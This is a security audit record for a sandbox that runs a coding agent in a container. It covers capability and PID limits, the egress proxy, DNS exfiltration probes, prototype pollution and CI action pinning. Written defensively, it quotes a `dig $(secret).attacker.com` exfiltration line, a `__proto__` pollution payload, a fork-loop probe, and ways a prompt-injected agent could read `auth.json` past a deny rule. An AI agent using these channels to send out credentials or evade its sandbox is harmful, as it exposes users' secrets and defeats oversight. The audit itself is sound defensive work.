<!--
SPDX-FileCopyrightText: 2026 Jan-Luca Bauß
SPDX-License-Identifier: AGPL-3.0-or-later
-->

# Security audit — 2026-07-09

Point-in-time security review performed before the beta declaration, covering
the surfaces named in the [ROADMAP](ROADMAP.md) item: container isolation,
provider-credential handling, the egress/network boundary, filesystem
boundaries, config-merge integrity, and the build/distribution supply chain.

This file is the **audit record** (findings, rationale, and the probes that
verify them). The **open, actionable items** live in [ROADMAP.md](ROADMAP.md)
under Security & sandboxing — this file does not re-track them. Fixes are
recorded in [CHANGELOG.md](CHANGELOG.md) when they ship.

## Method

Line-level read by Claude Fable 5 (Opus 4.8 fallback) of `bin/konrad`, `image/entrypoint.sh`,
`image/konrad-proxy-entrypoint.sh`,
`image/konrad-defaults/compose-allowed-hosts.sh`, `image/konrad-privdrop.sh`,
`image/merge-config.js`, `image/Dockerfile`,
`image/konrad-defaults/opencode-defaults.jsonc`, the bundled agents,
`.devcontainer/`, `scripts/*.sh`, and `.github/workflows/build-image.yml`,
checked against the CIS Docker Benchmark, OWASP container guidance, and OpenSSF
supply-chain hardening. Testable claims were verified (shellcheck, a
prototype-pollution repro, a `podman run` flag inventory).

## Overall assessment

**The core design is sound and beta-appropriate.** The exfiltration threat
model — assume the agent is prompt-injected — is defended architecturally, not
by prompt hygiene: a separate-netns default-deny egress proxy the agent's uid
cannot reach, a fail-closed host-gateway seal on apple/container, a non-root
runtime user, root-owned baked control scripts, and secrets confined to a named
volume and handed to the proxy read-only / ids-only.

The findings below are **hardening deltas and residual channels, not a broken
boundary.** None is a beta blocker on its own; the triage of which to close
before beta vs. defer is in [ROADMAP.md](ROADMAP.md).

## Findings

| # | Severity | Area | Finding | Disposition |
|---|---|---|---|---|
| 1 | Medium | Container hardening | No `--pids-limit` → fork-bomb PID exhaustion not directly bounded | Beta |
| 2 | Medium | Container hardening | No `--cap-drop=ALL` → agent runs with the engine's default capability set | Beta |
| 3 | Low–Med | Container hardening | No `--security-opt=no-new-privileges` | Beta |
| 4 | Low | Supply chain | CI actions on major-version tags (all first-party); majors had gone stale | Accepted posture; staleness fixed |
| 5 | Info | Egress | DNS resolution as a potential proxy-bypass exfil channel — **probed closed on both engines** | Resolved |
| 6 | Low | Config integrity | `merge-config.js` `deepMerge` is prototype-pollution-prone (confirmed) | Post-beta |
| 7 | Low | Egress | Proxy `Listen 0.0.0.0` / `Allow 0.0.0.0/0` reachable by co-resident containers on apple/container's shared `default` net | Post-beta |
| 8 | Low | Egress | `allowed_hosts` / `--allow-host` values become filter regex unsanitized | Post-beta |
| 9 | Low | Secrets | Agent can `cat` `auth.json`; containment is the firewall, not a read gate | Beta (document) |
| 10 | Low | Egress | `CONNECT` allowed to any port on an allow-listed host (no `ConnectPort`) | Accepted |

### 1. No `--pids-limit` (Medium)

[bin/konrad:1181-1222](bin/konrad#L1181-L1222) sets `--memory` and `--cpus` but
never `--pids-limit`. A fork bomb is only indirectly bounded. Podman may apply a
`containers.conf` default (often 2048), but relying on a daemon default is
fragile and apple/container gives no such guarantee.

**Fix:** add `--pids-limit` (e.g. 512–1024) to `res_flags`; both engines accept
the flag, so no `eng_*` wrapper is needed.

**Probe (baseline first):** in `konrad shell`, baseline
`for i in $(seq 1 50); do sleep 60 & done; jobs | wc -l` succeeds (env sane);
then a bounded fork loop must hit the ceiling and fail to spawn past the limit
rather than degrade the host — a pass proves the flag, not the absence of a bomb.

### 2. No `--cap-drop=ALL` (Medium) · 3. No `no-new-privileges` (Low–Med)

The run command ([bin/konrad:1200-1222](bin/konrad#L1200-L1222)) drops no
capabilities and sets no `no-new-privileges`. The only cap handling is
`--cap-add NET_ADMIN` on the apple/container seal
([bin/konrad:1148](bin/konrad#L1148)). Rootless Podman namespaces caps, so
exposure is limited — this is defense-in-depth (CIS 5.3 / 5.25) and cheap.

**Fix:** `--cap-drop=ALL` on the agent and the proxy; add back only `NET_ADMIN`
on the apple seal path. Add `--security-opt=no-new-privileges`. The agent
(uid 1000, no privileged binaries) and tinyproxy (binds >1024) should need no
caps — **verify against smoke + selftest**, since a missing cap surfaces at
runtime, not build.

### 4. CI action pinning + staleness (Low — supply chain)

[.github/workflows/build-image.yml](.github/workflows/build-image.yml) pins its
actions to **major-version tags**. Those are mutable, so a moved tag could run
attacker code with `packages: write` plus access to `HF_TOKEN` / `GITHUB_TOKEN`.
OpenSSF Scorecard flags this, but two facts right-size it:

- **All four actions are first-party** — `actions/checkout` (GitHub) and
  `docker/{setup-buildx,login,build-push}-action` (Docker). GitHub's own
  hardening guidance treats a major-version tag as an **acceptable** posture for
  trusted creators and reserves full-SHA pinning for third-party/unverified
  actions. The real-world tag-repoint incident (tj-actions, March 2025) was a
  *community* action; SHA-pinned users were spared. So the accepted posture here
  is: **major tags for first-party actions; SHA-pin any third-party/community
  action added later.**
- **The blast radius is already bounded** — each job's `permissions:` block is
  least-privilege (`contents: read`, `packages: write` only where needed), and
  the publish is smoke-gated. That containment matters more than pinning and is
  already in place.

**What the audit changed:** a version check found every major tag had gone
**stale** (major tags float *within* a major, never *across* one) — `checkout`
was 2 majors behind (`@v5` vs v7), the three Docker actions 1 behind. Bumped to
the current majors (`checkout@v7`, `build-push-action@v7`, `login-action@v4`,
`setup-buildx-action@v4`), which also retired the now-obsolete
`FORCE_JAVASCRIPT_ACTIONS_TO_NODE24` workaround (all four ship Node 24 natively
on v4/v7). Breaking changes reviewed: all Node 24 runtime bumps, satisfied by
the GitHub-hosted runners; no removed input/env the workflow uses. **A workflow
change is validated only by a CI round-trip** (build → smoke), so it must be
exercised on the mirror (a PR or a non-`main` `workflow_dispatch`) before it is
relied on. (`HF_TOKEN` is already handled correctly — a BuildKit `secrets:`
input, not a build-arg.)

**Post-beta automation** (ROADMAP): Renovate on GitLab to keep the pins current
(and optionally move to SHA-pins) via auto-merging MRs — the same
"bot re-resolves, auto-merge" pattern as `resolve-locks`, so staleness can't
silently recur without hand-maintenance.

### 5. DNS as a proxy-bypass exfil channel (Info — probed closed on both engines, incl. native Linux)

The forward-proxy design contains HTTP(S) egress well, but a prompt-injected
agent has `bash: allow` and the image ships `dnsutils`
([Dockerfile:224](image/Dockerfile#L224)). The concern: if the agent's internal
network could still resolve arbitrary external names (aardvark-dns forwarding
unknown queries upstream even on `--internal` nets), then
`dig $(secret).attacker.com` would be a low-bandwidth channel that never touches
tinyproxy. **Probed on both engines, 2026-07-09 — closed on both.**

- **apple/container:** baseline `curl -m 8 https://example.com` →
  `403 CONNECT tunnel failed` (boundary live); every `dig` / canary lookup then
  failed with `192.168.134.1#53 … no servers could be reached` — the
  internal-net gateway (where the resolver lives) is unreachable because the
  **egress seal blackholes it**. The seal closes the DNS channel as a side
  effect.
- **Podman:** same control (`403`); `dig +short google.com`, the canary lookup,
  and `getent hosts` all returned **empty** — aardvark resolves container names
  but does not forward external queries off the `--internal` net. Confirmed on
  **both** the macOS podman-machine VM **and a native Linux + Podman host**
  (2026-07-09) — nothing egressed on either.

**Fully verified; residual is only a regression guard.** Under `--no-firewall`
the agent has unrestricted egress by design (DNS and HTTP alike) — the
documented bypass (see #9), not a finding. The only follow-on is a `selftest`
assertion on Linux CI (firewall on → control `curl` fails *and* an external
`dig` returns empty) to catch a future netavark/resolver change; folded into the
Automated test suite item in the ROADMAP. Mitigation if a future stack ever
forwards: scope the container resolver to the proxy host, or block outbound 53.

### 6. `merge-config.js` prototype pollution (Low — confirmed)

`deepMerge` ([image/merge-config.js:80-91](image/merge-config.js#L80-L91))
iterates `Object.keys(source)` and assigns `target[key] = …` without excluding
`__proto__`. Reproduced: merging `{"__proto__":{"polluted":"yes"}}` sets
`Object.prototype.polluted` in the merge process. **Real-world impact is
limited** — the process is short-lived, emits own-keys-only JSON (output config
unaffected), and config layers are trusted (an org layer already runs a
host-side `post-sync` hook by design). Cheap two-line fix worth taking.

**Fix:** skip `__proto__` / `constructor` / `prototype` in the key loop; add a
fixture to the planned merge-config unit tests.

### 7. Proxy bind exposure (Low) · 8. Unsanitized allow-list entries (Low)

- The proxy binds `Listen 0.0.0.0` with `Allow 0.0.0.0/0`
  ([konrad-proxy-entrypoint.sh:77-84](image/konrad-proxy-entrypoint.sh#L77-L84)).
  Harmless on Podman (dedicated egress net); on apple/container the egress leg
  is the shared engine `default` net, so a co-resident container could reach the
  proxy — still destination-filtered, so the blast radius is "reach the same
  allow-list," not an open relay. Consider binding to the internal-net interface.
- `allowed_hosts` / `KONRAD_ALLOWED_HOSTS` entries reach the filter with only
  dots escaped
  ([compose-allowed-hosts.sh:92-105](image/konrad-defaults/compose-allowed-hosts.sh#L92-L105),
  [konrad-proxy-entrypoint.sh:61](image/konrad-proxy-entrypoint.sh#L61)), so an
  entry like `[a-z]+\.evil\.com` becomes live regex. Self/org-inflicted under
  the trust model, but validating against `^[A-Za-z0-9.*-]+$` removes the
  surprise.

### 9. Credential read path (Low — largely by design; document for beta)

`external_directory: {"/home/node/.opencode-secrets/**": "deny"}`
([opencode-defaults.jsonc:135-138](image/konrad-defaults/opencode-defaults.jsonc#L135-L138))
gates only opencode's Read tool. Since `bash: "*": "allow"`, a prompt-injected
agent can `cat auth.json`. This is inherent (opencode needs the keys) and the
real containment is the egress firewall — correctly reasoned in the code
comments. A bash-level deny would be theater (trivially bypassed via
`python -c open(...)`), so it is not recommended. The residual to **document
plainly for beta users**: `--no-firewall` removes credential-exfil containment
entirely, and copying a key onto `/workspace` on disk is never prevented.

### 10. `CONNECT` to any port (Low — accepted)

No `ConnectPort` lines
([konrad-proxy-entrypoint.sh:72-74](image/konrad-proxy-entrypoint.sh#L72-L74))
means `CONNECT` reaches any port on an allow-listed host. Deliberate (non-443
providers), low-risk since the host is trusted; recorded for completeness.

## Done well

- **Anchored default-deny filter**
  ([konrad-proxy-entrypoint.sh:55-64](image/konrad-proxy-entrypoint.sh#L55-L64)) —
  the `^host(:port)?$` anchor closes tinyproxy's substring-match bypass
  (`api.example.com.attacker.net`).
- **Fail-closed seal** ([bin/konrad:1145-1148](bin/konrad#L1145-L1148)) and a
  privilege drop that clears the capability bounding set
  (`setpriv --bounding-set=-all`,
  [konrad-privdrop.sh:22-33](image/konrad-privdrop.sh#L22-L33)).
- **Boundary in the engine, not the agent** — two networks, agent on the
  internal one only; enforcement survives a root-level agent compromise.
- **Root-owned baked scripts** so uid 1000 cannot rewrite the allow-list logic;
  secrets never touch the workspace; the proxy gets the secrets volume
  read-only, ids-only.
- **Supply chain**: digest-pinned inputs, a daily lock bot, smoke-gated publish,
  reproducible layers, `HF_TOKEN` as a build secret, fork-PR publish skipped.
- **`$HOME`-as-workspace guard** and a non-root `USER node` final stage.

## Not covered / future

- **`SECURITY.md` (vulnerability-reporting policy)** — separate from this audit
  record; worth adding for a public beta.
- **Read-only root filesystem / writable-path minimization** — tracked as a
  post-beta hardening item in [ROADMAP.md](ROADMAP.md).
- **Image signing (cosign/sigstore)** and installer checksum/signature — the
  `curl | sh` install trusts TLS today; signing is post-beta hardening.
- **MCP tool surface** — no bundled MCP servers ship today; the surface is
  user-declared servers authenticated via `konrad mcp-auth` (firewall-off, no
  agent in the loop). Re-audit when a server is bundled.
